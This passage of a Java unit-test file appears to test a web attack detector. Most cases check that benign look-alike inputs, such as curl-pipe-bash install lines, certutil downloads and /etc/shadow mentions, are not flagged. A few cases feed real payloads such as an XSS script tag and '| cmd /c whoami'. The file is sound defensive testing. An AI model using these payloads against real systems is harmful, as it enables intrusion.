        assertNoCategory(matcher.scan(
            "{\"description\":\"Wire transfer; update beneficiary name to O'Brien -- ref#42981\",\"amount\":500}", "body"), "sqli", "transaction with semicolons and dashes");
    }

    @Test public void fpDeepSqli_14_buildLogSemicolonCreate() {
        // Build log: "; create" matches stacked queries
        assertNoCategory(matcher.scan(
            "{\"build_log\":\"Compilation successful; create artifact bundle for deployment\"}", "body"), "sqli", "build log semicolon create");
    }

    // --- XSS deep FPs ---

    @Test public void fpDeepXss_01_supportTicketScriptTag() {
        // Bug report discussing HTML source code with literal <script> tag
        assertNoCategory(matcher.scan(
            "{\"ticket\":\"The <script> tag on line 42 of index.html is causing a console error\"}", "body"), "xss", "support ticket about script tag");
    }

    @Test public void fpDeepXss_02_codeReviewInlineScript() {
        // Code review comment mentioning script tag
        assertNoCategory(matcher.scan(
            "{\"comment\":\"Please remove the inline <script type='text/javascript'> block and move it to a separate file\"}", "body"), "xss", "code review about script tag");
    }

    @Test public void fpDeepXss_03_youtubeIframeEmbed() {
        // CMS embed — legitimate YouTube iframe
        assertNoCategory(matcher.scan(
            "{\"widget\":\"<iframe src='https://youtube.com/embed/abc123' width='560'></iframe>\"}", "body"), "xss", "YouTube iframe embed");
    }

    @Test public void fpDeepXss_04_pdfObjectEmbed() {
        // PDF viewer in CMS using embed tag
        assertNoCategory(matcher.scan(
            "{\"viewer\":\"<embed src='/media/report.pdf' type='application/pdf' width='100%'>\"}", "body"), "xss", "PDF embed tag");
    }

    @Test public void fpDeepXss_05_docsJavascriptVoid() {
        // Documentation mentioning javascript:void(0) as bad practice
        assertNoCategory(matcher.scan(
            "{\"doc\":\"Never use href='javascript:void(0)' -- use a button element instead\"}", "body"), "xss", "docs about javascript void");
    }

    @Test public void fpDeepXss_06_uiSpecConfirmDialog() {
        // UI spec with confirm('...') in requirements
        assertNoCategory(matcher.scan(
            "{\"spec\":\"On form submit, display confirm('Do you want to proceed?') dialog\"}", "body"), "xss", "UI spec confirm dialog");
    }

    @Test public void fpDeepXss_07_testCaseAlertMessage() {
        // QA test case with alert() in description
        assertNoCategory(matcher.scan(
            "{\"test_case\":\"Verify that alert('Session expired') appears after 30 minutes\"}", "body"), "xss", "QA test case alert");
    }

    @Test public void fpDeepXss_08_analyticsScriptInstall() {
        // Docs: add analytics script tag
        assertNoCategory(matcher.scan(
            "{\"instructions\":\"Paste <script src='https://analytics.example.com/track.js'></script> into your page header\"}", "body"), "xss", "analytics script install instructions");
    }

    @Test public void fpDeepXss_09_svgDoctype() {
        // Valid SVG with W3C DOCTYPE
        assertNoCategory(matcher.scan(
            "<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><rect x='10' y='10' width='80' height='80' fill='blue'/></svg>", "body"), "xss", "valid SVG image");
    }

    @Test public void fpDeepXss_10_legacyCssExpressionDocs() {
        // Documentation about legacy IE CSS expressions
        assertNoCategory(matcher.scan(
            "{\"article\":\"IE6 supported style='width: expression(document.body.clientWidth)' for dynamic sizing\"}", "body"), "xss", "CSS expression in legacy docs");
    }

    // --- Command Injection deep FPs ---

    @Test public void fpDeepCmd_01_readmeInstallCurl() {
        // README with install instructions: "; curl" and "| bash"
        assertNoCategory(matcher.scan(
            "{\"readme\":\"To install dependencies; curl -sSL https://get.docker.com | bash\"}", "body"), "os_cmd", "README install with curl pipe bash");
    }

    @Test public void fpDeepCmd_02_dockerfileCurlBash() {
        // Dockerfile content: "&& curl" and "| bash"
        assertNoCategory(matcher.scan(
            "{\"dockerfile\":\"RUN apt-get update && curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\"}", "body"), "os_cmd", "Dockerfile curl pipe bash");
    }

    @Test public void fpDeepCmd_03_runbookGrepSort() {
        // Ops runbook: "grep ERROR /var/log/app.log | sort" matches pipe chain
        assertNoCategory(matcher.scan(
            "{\"runbook\":\"To find errors, run: grep ERROR /var/log/app.log | sort | grep -v DEBUG\"}", "body"), "os_cmd", "runbook grep pipe sort");
    }

    @Test public void fpDeepCmd_04_shellScriptSubstitution() {
        // Config with $(cat ...) command substitution
        assertNoCategory(matcher.scan(
            "{\"startup_script\":\"HOSTNAME=$(hostname) && VERSION=$(cat /app/version.txt)\"}", "body"), "os_cmd", "shell script command substitution");
    }

    @Test public void fpDeepCmd_05_ciLogChainedCommands() {
        // Build log: "&& ls -la && cat version.txt"
        assertNoCategory(matcher.scan(
            "{\"build_log\":\"Step 3/8: && ls -la /app/build && cat /app/build/version.txt\"}", "body"), "os_cmd", "CI build log with chained commands");
    }

    @Test public void fpDeepCmd_06_retryPolicySleep() {
        // Retry config: "; sleep 5" matches sleep/delay pattern
        assertNoCategory(matcher.scan(
            "{\"retry_policy\":\"on failure; sleep 5 && retry\"}", "body"), "os_cmd", "retry policy with sleep");
    }

    @Test public void fpDeepCmd_07_cronJobTimeout() {
        // Cron description: "; timeout 30" matches sleep/delay
        assertNoCategory(matcher.scan(
            "{\"cron_desc\":\"Run health check every minute; timeout 30 curl localhost:8080/health\"}", "body"), "os_cmd", "cron job with timeout");
    }

    @Test public void fpDeepCmd_08_monitoringCatGrep() {
        // Monitoring template: "cat /proc/meminfo | grep MemFree"
        assertNoCategory(matcher.scan(
            "{\"diagnostic_cmd\":\"cat /proc/meminfo | grep MemFree\"}", "body"), "os_cmd", "monitoring cat pipe grep");
    }

    @Test public void fpDeepCmd_09_backtickLegacyShell() {
        // Old-style shell substitution in config
        assertNoCategory(matcher.scan(
            "{\"pre_deploy\":\"`curl -s https://api.example.com/version`\"}", "body"), "os_cmd", "legacy backtick curl substitution");
    }

    @Test public void fpDeepCmd_10_dockerEntrypointSleep() {
        // Docker startup: "sleep 10 && run migrations"
        assertNoCategory(matcher.scan(
            "{\"entrypoint\":\"wait for database; sleep 10 && run migrations\"}", "body"), "os_cmd", "docker entrypoint sleep");
    }

    // --- Windows Command Injection deep FPs ---

    @Test public void fpDeepWin_01_itDocsNslookup() {
        // IT helpdesk: "nslookup api.example.com" matches windows_system_commands
        assertNoCategory(matcher.scan(
            "{\"article\":\"Run nslookup api.example.com to verify DNS resolution\"}", "body"), "windows", "IT docs nslookup");
    }

    @Test public void fpDeepWin_02_certManagement() {
        // PKI docs: "certutil -urlcache" matches windows_system_commands
        assertNoCategory(matcher.scan(
            "{\"guide\":\"Use certutil -urlcache -split -f to download the CA cert\"}", "body"), "windows", "certificate management docs");
    }

    @Test public void fpDeepWin_03_serviceManagementNetStart() {
        // Windows admin: "net start SQLServerAgent" matches windows_net_commands
        assertNoCategory(matcher.scan(
            "{\"action\":\"net start SQLServerAgent\",\"server\":\"db-prod-01\"}", "body"), "windows", "net start SQL service");
    }

    @Test public void fpDeepWin_04_fileSharingNetUse() {
        // File sharing docs: "net use Z:" matches windows_net_commands
        assertNoCategory(matcher.scan(
            "{\"guide\":\"Map the network drive with net use Z: \\\\\\\\fileserver\\\\share\"}", "body"), "windows", "net use file share");
    }

    @Test public void fpDeepWin_05_buildConfigPowershell() {
        // Windows CI: powershell.exe -File build.ps1
        assertNoCategory(matcher.scan(
            "{\"build_tool\":\"powershell.exe -File build.ps1\",\"platform\":\"windows\"}", "body"), "windows", "Windows CI powershell build");
    }

    @Test public void fpDeepWin_06_sysMonitorTasklist() {
        // Windows monitoring: "tasklist /FI"
        assertNoCategory(matcher.scan(
            "{\"diagnostic\":\"tasklist /FI IMAGENAME eq java.exe\"}", "body"), "windows", "sys monitor tasklist");
    }

    @Test public void fpDeepWin_08_cmdFieldInPayload() {
        // JSON payload where "cmd" is a field value — e.g. a chatbot command type or message type indicator
        assertEmpty(matcher.scan(
            "{\"type\":\"cmd\",\"action\":\"restart_service\",\"target\":\"api-gateway\"}", "body"), "cmd as JSON field value");
    }

    @Test public void fpDeepWin_09_cmdInUserMessage() {
        // User message mentioning "cmd" in natural language — should not trigger command injection
        assertEmpty(matcher.scan(
            "{\"message\":\"Open cmd and run the build script to deploy your app\"}", "body"), "cmd in user message");
    }

    @Test public void fpDeepWin_07_sessionCheckNetSession() {
        // IT runbook: "net session"
        assertNoCategory(matcher.scan(
            "{\"runbook\":\"To check active sessions, run net session on the file server\"}", "body"), "windows", "net session check");
    }

    // --- SSRF deep FPs ---

    @Test public void fpDeepSsrf_01_microserviceDbConfig() {
        // Standard microservice config with localhost DB
        assertNoCategory(matcher.scan(
            "{\"database_url\":\"http://localhost:5432\",\"cache_url\":\"http://localhost:6379\"}", "body"), "ssrf", "microservice DB config");
    }

    @Test public void fpDeepSsrf_02_openApiSpec() {
        // Every OpenAPI/Swagger spec has localhost servers
        assertNoCategory(matcher.scan(
            "{\"servers\":[{\"url\":\"http://localhost:8080\",\"description\":\"Local development server\"}]}", "body"), "ssrf", "OpenAPI spec localhost");
    }

    @Test public void fpDeepSsrf_03_prometheusTargets() {
        // Monitoring scrape targets
        assertNoCategory(matcher.scan(
            "{\"targets\":[\"http://localhost:9090/metrics\",\"http://0.0.0.0:9100/metrics\"]}", "body"), "ssrf", "Prometheus scrape targets");
    }

    @Test public void fpDeepSsrf_04_webhookPrivateIp() {
        // Internal service webhook — private IPs are normal in microservices
        assertNoCategory(matcher.scan(
            "{\"callback_url\":\"http://10.0.1.50:8443/webhooks/stripe\"}", "body"), "ssrf", "internal webhook private IP");
    }

    @Test public void fpDeepSsrf_05_k8sServiceDiscovery() {
        // K8s cluster-internal service address
        assertNoCategory(matcher.scan(
            "{\"cluster_ip\":\"http://10.96.0.1:443\",\"service\":\"kubernetes\"}", "body"), "ssrf", "K8s service discovery");
    }

    @Test public void fpDeepSsrf_06_vpnIntranetDocs() {
        // Corporate intranet documentation
        assertNoCategory(matcher.scan(
            "{\"wiki_url\":\"Connect to the internal wiki at http://172.16.0.50:8090/confluence\"}", "body"), "ssrf", "VPN intranet docs");
    }

    @Test public void fpDeepSsrf_07_dockerHealthCheck() {
        // Docker container health check
        assertNoCategory(matcher.scan(
            "{\"healthcheck\":{\"test\":[\"CMD\",\"curl\",\"-f\",\"http://localhost:8080/health\"]}}", "body"), "ssrf", "Docker health check localhost");
    }

    @Test public void fpDeepSsrf_08_cloudMetadataDocs() {
        // AWS documentation about metadata endpoint
        assertNoCategory(matcher.scan(
            "{\"docs\":\"The instance metadata endpoint at http://169.254.169.254/latest/meta-data/ provides instance identity\"}", "body"), "ssrf", "cloud metadata docs");
    }

    @Test public void fpDeepSsrf_09_tftpBootConfig() {
        // PXE boot config with tftp://
        assertNoCategory(matcher.scan(
            "{\"boot_file_url\":\"tftp://10.0.0.1/pxelinux.0\",\"description\":\"PXE boot config\"}", "body"), "ssrf", "TFTP boot config");
    }

    @Test public void fpDeepSsrf_10_fileProtocolDocs() {
        // Browser file:// protocol documentation
        assertNoCategory(matcher.scan(
            "{\"article\":\"Browser file:// protocol is used to access local files\"}", "body"), "ssrf", "file protocol docs");
    }

    // --- LFI deep FPs ---

    @Test public void fpDeepLfi_01_webpackRelativePaths() {
        // Build tool config with ../../ relative paths
        assertNoCategory(matcher.scan(
            "{\"alias\":{\"@components\":\"../../src/components\",\"@utils\":\"../../src/utils\"}}", "body"), "lfi", "webpack alias relative paths");
    }

    @Test public void fpDeepLfi_02_gitDiffPaths() {
        // Git diff with ../../ paths
        assertNoCategory(matcher.scan(
            "--- a/../../old/path/file.js\\n+++ b/../../new/path/file.js", "body"), "lfi", "git diff relative paths");
    }

    @Test public void fpDeepLfi_03_linuxTutorialEtcPasswd() {
        // Linux tutorial mentioning /etc/passwd
        assertNoCategory(matcher.scan(
            "{\"tutorial\":\"The /etc/passwd file contains user account information in colon-separated format\"}", "body"), "lfi", "Linux tutorial /etc/passwd");
    }

    @Test public void fpDeepLfi_04_ansibleEtcPasswd() {
        // Ansible playbook referencing /etc/passwd
        assertNoCategory(matcher.scan(
            "{\"tasks\":[{\"copy\":{\"src\":\"templates/passwd.j2\",\"dest\":\"/etc/passwd\"}}]}", "body"), "lfi", "Ansible /etc/passwd");
    }

    @Test public void fpDeepLfi_05_securityAuditProcSelf() {
        // Security compliance docs referencing /proc/self/environ
        assertNoCategory(matcher.scan(
            "{\"check\":\"Verify /proc/self/environ is not world-readable for security compliance\"}", "body"), "lfi", "security audit proc self");
    }

    @Test public void fpDeepLfi_06_phpDocumentationWrappers() {
        // PHP tutorial about input streams
        assertNoCategory(matcher.scan(
            "{\"php_docs\":\"Use php://input to read raw POST data\"}", "body"), "lfi", "PHP docs about wrappers");
    }

    @Test public void fpDeepLfi_07_codeReviewPhpFilter() {
        // Code review mentioning php://filter
        assertNoCategory(matcher.scan(
            "{\"review\":\"Replace php://filter/convert.base64-encode with proper file reading\"}", "body"), "lfi", "code review php filter");
    }

    @Test public void fpDeepLfi_08_threeRelativeImports() {
        // Deep JS import path
        assertNoCategory(matcher.scan(
            "{\"code\":\"import { utils } from '../../../shared/utils'\"}", "body"), "lfi", "deep relative import");
    }

    @Test public void fpDeepLfi_09_serverHardeningEtcShadow() {
        // Hardening guide referencing /etc/shadow
        assertNoCategory(matcher.scan(
            "{\"guide\":\"Restrict access to /etc/shadow using chmod 640\"}", "body"), "lfi", "server hardening /etc/shadow");
    }

    // --- NoSQL deep FPs ---

    @Test public void fpDeepNosql_01_mongoApiDocs() {
        // MongoDB API documentation with quoted operators
        assertNoCategory(matcher.scan(
            "{\"description\":\"Use \\\"$eq\\\" for exact match, \\\"$gt\\\" for greater than, \\\"$in\\\" for set membership\"}", "body"), "nosql", "MongoDB API docs");
    }

    @Test public void fpDeepNosql_02_elasticsearchRange() {
        // Elasticsearch-style query using MongoDB operators
        assertNoCategory(matcher.scan(
            "{\"range\":{\"price\":{\"$gte\":100,\"$lte\":500}}}", "body"), "nosql", "Elasticsearch range query");
    }

    @Test public void fpDeepNosql_03_validationRules() {
        // Form validation schema with MongoDB operators
        assertNoCategory(matcher.scan(
            "{\"age\":{\"$gt\":18,\"$lt\":120},\"email\":{\"$regex\":\"^[a-z]\"}}", "body"), "nosql", "validation rules with operators");
    }

    @Test public void fpDeepNosql_04_analyticsFilter() {
        // Dashboard analytics filter
        assertNoCategory(matcher.scan(
            "{\"filter\":{\"timestamp\":{\"$gte\":\"2026-01-01\"},\"status\":{\"$in\":[\"active\",\"pending\"]}}}", "body"), "nosql", "analytics filter");
    }

    @Test public void fpDeepNosql_05_complexLogicalQuery() {
        // Standard MongoDB logical query
        assertNoCategory(matcher.scan(
            "{\"$and\":[{\"status\":\"active\"},{\"$or\":[{\"role\":\"admin\"},{\"role\":\"editor\"}]}]}", "body"), "nosql", "complex logical query");
    }

    @Test public void fpDeepNosql_06_aggregationPipeline() {
        // Standard MongoDB aggregation
        assertNoCategory(matcher.scan(
            "{\"pipeline\":[{\"$match\":{\"date\":{\"$gte\":\"2026-01-01\"}}},{\"$group\":{\"_id\":\"$category\"}}]}", "body"), "nosql", "aggregation pipeline");
    }

    @Test public void fpDeepNosql_07_preferencesUpdate() {
        // User preferences using $set/$push
        assertNoCategory(matcher.scan(
            "{\"$set\":{\"theme\":\"dark\",\"lang\":\"en\"},\"$push\":{\"recent_views\":\"product-123\"}}", "body"), "nosql", "user preferences update");
    }

    @Test public void fpDeepNosql_08_mongoTutorialDbFind() {
        // Tutorial: "db.users.find({...})" matches db operations
        assertNoCategory(matcher.scan(
            "{\"tutorial\":\"Use db.users.find({active: true}) to query all active users\"}", "body"), "nosql", "mongo tutorial db.find");
    }

    @Test public void fpDeepNosql_09_slowQueryAlert() {
        // DB monitoring alert with db.aggregate
        assertNoCategory(matcher.scan(
            "{\"alert\":\"Slow query detected: db.orders.aggregate([{$match: {status: pending}}])\"}", "body"), "nosql", "slow query monitoring alert");
    }

    // --- XXE deep FPs ---

    @Test public void fpDeepXxe_01_soapDtdReference() {
        // Legacy SOAP with valid DTD reference
        assertNoCategory(matcher.scan(
            "<?xml version='1.0'?><!DOCTYPE note SYSTEM 'note.dtd'><note><body>Meeting at 3pm</body></note>", "body"), "xxe", "SOAP DTD reference");
    }

    @Test public void fpDeepXxe_02_svgW3cDoctype() {
        // Valid SVG with W3C DOCTYPE
        assertNoCategory(matcher.scan(
            "<!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 1.1//EN' 'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg></svg>", "body"), "xxe", "SVG W3C DOCTYPE");
    }

    @Test public void fpDeepXxe_03_xhtmlDoctype() {
        // Standard XHTML DOCTYPE
        assertNoCategory(matcher.scan(
            "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>", "body"), "xxe", "XHTML DOCTYPE");
    }

    // --- SSTI deep FPs ---

    @Test public void fpDeepSsti_01_jinjaEmailTemplate() {
        // Jinja/Handlebars email template with {{request.user}} and {{config.app_name}}
        assertNoCategory(matcher.scan(
            "Dear {{request.user.first_name}}, your {{config.app_name}} account is ready", "body"), "ssti", "Jinja email template");
    }

    @Test public void fpDeepSsti_02_angularSelfTemplate() {
        // Angular template with {{self.getUserName()}}
        assertNoCategory(matcher.scan(
            "<div>{{self.getUserName()}}</div>", "body"), "ssti", "Angular self template");
    }

    @Test public void fpDeepSsti_03_springBootTemplate() {
        // JSP/Thymeleaf with ${request.getParameter} and ${session.id}
        assertNoCategory(matcher.scan(
            "Hello ${request.getParameter('name')}, session ID: ${session.id}", "body"), "ssti", "Spring Boot template");
    }

    @Test public void fpDeepSsti_04_logFormatConfig() {
        // Logging config with ${application.name} and ${runtime.version}
        assertNoCategory(matcher.scan(
            "{\"log_format\":\"${application.name}-${runtime.version}-${config.env}\"}", "body"), "ssti", "log format config");
    }

    @Test public void fpDeepSsti_05_gradleBuild() {
        // Gradle build file with ${runtime.spring_version}
        assertNoCategory(matcher.scan(
            "{\"dependency\":\"org.springframework:spring-core:${runtime.spring_version}\"}", "body"), "ssti", "Gradle build variable");
    }

    @Test public void fpDeepSsti_06_pythonMroDocs() {
        // Python docs about __mro__ in Jinja context
        assertNoCategory(matcher.scan(
            "{\"docs\":\"Access the method resolution order with {{MyClass.__mro__}} in Jinja templates\"}", "body"), "ssti", "Python MRO docs");
    }

    // --- LDAP deep FPs ---

    @Test public void fpDeepLdap_01_standardObjectClassSearch() {
        // Legitimate LDAP wildcard search: (& (objectClass=*) (...))
        assertNoCategory(matcher.scan(
            "{\"filter\":\"(& (objectClass=*) (ou=Engineering))\"}", "body"), "ldap", "standard LDAP objectClass search");
    }

    @Test public void fpDeepLdap_02_adUserSearch() {
        // Active Directory search with OR and wildcards
        assertNoCategory(matcher.scan(
            "{\"search\":\"(| (department=*Sales*) (department=*Marketing*))\"}", "body"), "ldap", "AD department search");
    }

    // --- Cross-category deep FPs: realistic multi-vector payloads ---

    @Test
    public void fpDeepCross_01_ecommerceProductSearch() {
        // E-commerce search with product names: "Drop Table Lamp", "Cat 5e Cable", "Union Jack"
        String payload = "Drop Table Lamp with adjustable arm | Cat 5e Cable | Select from our Union Jack collection";
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "e-commerce product search");
    }

    @Test
    public void fpDeepCross_02_terraformPlanOutput() {
        // IaC plan: private IP + "; update" + "; delete...from"
        String payload = "{\"changes\":\"Create http://10.0.1.50:8080/api resource; update security group; delete old instances from vpc-123\"}";
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "Terraform plan output");
    }

    @Test
    public void fpDeepCross_03_k8sLivenessProbe() {
        // K8s config: wget, curl, sleep, localhost, private IP all present
        String payload = "{\"spec\":{\"containers\":[{\"command\":[\"sh\",\"-c\",\"wget -q http://localhost:8080/health || sleep 5 && curl http://10.0.0.1:9090/ready\"]}]}}";
        // This legitimately contains many patterns, just verify it's not catastrophic
        List<HyperscanThreatMatcher.MatchResult> results = matcher.scan(payload, "body");
        // K8s configs will trigger some patterns — just document and ensure it doesn't crash
        assertNotNull("should not crash on K8s config", results);
    }

    @Test
    public void fpDeepCross_04_devSlackMessage() {
        // Developer chat: piped commands + sleep + private IP
        String payload = "{\"message\":\"Hey team, can someone cat /var/log/app.log and check if the sleep timeout in the retry config is causing 502s? Also the webhook at http://192.168.1.50:3000/hooks is returning 403\"}";
        // Chat messages about commands will trigger — just verify no crash and no XSS/SQLi
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "dev Slack message");
        assertNoCategory(matcher.scan(payload, "body"), "xss", "dev Slack message");
    }

    @Test
    public void fpDeepCross_05_logSearchQuery() {
        // Log aggregation query: "/etc/passwd" + "AND true"
        String payload = "{\"query\":\"level:ERROR AND path:/etc/passwd AND message:file not found OR status:500\"}";
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "log search query");
    }

    @Test
    public void fpDeepCross_06_dockerComposeFull() {
        // Docker Compose: localhost IP + bash + sleep + exec
        String payload = "{\"services\":{\"db\":{\"image\":\"postgres\",\"ports\":[\"127.0.0.1:5432:5432\"]},\"app\":{\"command\":\"bash -c 'exec java -jar app.jar'\"}}}";
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "Docker Compose config");
        assertNoCategory(matcher.scan(payload, "body"), "xss", "Docker Compose config");
    }

    @Test
    public void fpDeepCross_07_healthcareApi() {
        // HL7 FHIR with "SELECT" and "Union" in clinical context
        String payload = "{\"resourceType\":\"Observation\",\"code\":{\"text\":\"SELECT insulin pump readings\"},\"category\":[{\"coding\":[{\"display\":\"Union of measurements from glucose monitor\"}]}]}";
        assertNoCategory(matcher.scan(payload, "body"), "sqli", "healthcare FHIR API");
    }

    // =====================================================================
    //  SCAN REQUEST/RESPONSE INTEGRATION
    // =====================================================================

    @Test
    public void scan_xssInUrl() {
        Map<String, List<HyperscanThreatMatcher.MatchResult>> r = matcher.scanRequest(
            "/q=<script>alert(1)</script>", "{host=[example.com]}", "{\"q\":\"ok\"}");
        assertTrue("XSS in URL detected", r.containsKey("url"));
        assertFalse("clean body no match", r.containsKey("body"));
    }

    @Test
    public void scan_cmdInBody() {
        Map<String, List<HyperscanThreatMatcher.MatchResult>> r = matcher.scanRequest(
            "/api/exec", "{host=[example.com]}", "| cmd /c whoami");
        assertTrue("cmd injection in body detected", r.containsKey("body"));
    }

    @Test
    public void scan_stackTraceResp() {
        Map<String, List<HyperscanThreatMatcher.MatchResult>> r = matcher.scanResponse(
            "{content-type=[text/html]}",
            "Exception in thread \"main\" java.lang.NullPointerException\n  at com.example.Service.process(Service.java:42)");
        assertTrue("stack trace in resp body", r.containsKey("resp_body"));
    }

    // =====================================================================
    //  HELPERS
    // =====================================================================

    /**
     * Asserts that scanning payload at location produces a match with the
     * given exact prefix AND that the matched text overlaps the expected keyword.
     *
     * Phrase overlap is lenient: Hyperscan SOM_LEFTMOST may truncate the last
     * 1-2 characters of the match, so we check both contains and prefix-minus-one.
     */
    private void assertMatch(String payload, String location, String expectedPrefix, String phraseSubstring) {
        List<HyperscanThreatMatcher.MatchResult> results = matcher.scan(payload, location);
        assertFalse("No detection for: " + trunc(payload), results.isEmpty());

        boolean prefixFound = false;
        boolean phraseFound = false;
        StringBuilder detail = new StringBuilder();
        for (HyperscanThreatMatcher.MatchResult r : results) {
            detail.append(String.format("\n  prefix=%-35s phrase='%s'", r.prefix, trunc(r.matchedText)));
            if (r.prefix.equals(expectedPrefix)) {
                prefixFound = true;
                if (phraseOverlaps(r.matchedText, phraseSubstring)) {
                    phraseFound = true;
                }
            }
        }

        assertTrue("Expected prefix '" + expectedPrefix + "' not found for: " + trunc(payload) + detail, prefixFound);
        assertTrue("Phrase '" + phraseSubstring + "' not in matchedText for prefix '" + expectedPrefix + "': " + trunc(payload) + detail, phraseFound);
    }

    /**
     * Like assertMatch but accepts any of several prefixes.
     */
    private void assertMatchAnyPrefix(String payload, String location, String[] acceptedPrefixes, String phraseSubstring) {
        List<HyperscanThreatMatcher.MatchResult> results = matcher.scan(payload, location);
        assertFalse("No detection for: " + trunc(payload), results.isEmpty());

        boolean found = false;
        StringBuilder detail = new StringBuilder();
        for (HyperscanThreatMatcher.MatchResult r : results) {
            detail.append(String.format("\n  prefix=%-35s phrase='%s'", r.prefix, trunc(r.matchedText)));
            for (String accepted : acceptedPrefixes) {
                if (r.prefix.equals(accepted) && phraseOverlaps(r.matchedText, phraseSubstring)) {
                    found = true;
                }
            }
        }

        assertTrue("None of " + Arrays.toString(acceptedPrefixes) + " with phrase '" + phraseSubstring + "': " + trunc(payload) + detail, found);
    }

    /**
     * Checks if matchedText overlaps with phrase, tolerant of Hyperscan's
     * SOM_LEFTMOST off-by-one truncation at the end.
     */
    private boolean phraseOverlaps(String matchedText, String phrase) {
        String mt = matchedText.toLowerCase();
        String ph = phrase.toLowerCase();
        // Direct contains (ideal case)
        if (mt.contains(ph)) return true;
        // Hyperscan may truncate last 1-2 chars: check if phrase-minus-1 is in match
        if (ph.length() > 2 && mt.contains(ph.substring(0, ph.length() - 1))) return true;
        // Or the match text itself is a substring of the phrase (very short match)
        if (mt.length() >= 3 && ph.contains(mt)) return true;
        return false;
    }

    private void assertNoCategory(List<HyperscanThreatMatcher.MatchResult> results, String cat, String msg) {
        for (HyperscanThreatMatcher.MatchResult r : results) {
            assertFalse(msg + " - unexpected " + cat + ": " + r.prefix, r.category.equals(cat));
        }
    }

    private void assertNoPrefix(List<HyperscanThreatMatcher.MatchResult> results, String prefix, String msg) {
        for (HyperscanThreatMatcher.MatchResult r : results) {
            assertFalse(msg + " - unexpected " + prefix, r.prefix.equals(prefix));
        }
    }

    private void assertEmpty(List<HyperscanThreatMatcher.MatchResult> results, String msg) {
        assertTrue(msg + " should trigger nothing, got: " + fmt(results), results.isEmpty());
    }

    private static String fmt(List<HyperscanThreatMatcher.MatchResult> results) {
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < Math.min(results.size(), 5); i++) {
            if (i > 0) sb.append(", ");
            HyperscanThreatMatcher.MatchResult r = results.get(i);
            sb.append(r.prefix).append("='").append(trunc(r.matchedText)).append("'");
        }
        if (results.size() > 5) sb.append("+").append(results.size() - 5).append(" more");
        return sb.append("]").toString();
    }

    private static String trunc(String s) {
        return s.length() <= 60 ? s : s.substring(0, 60) + "...";
    }
}
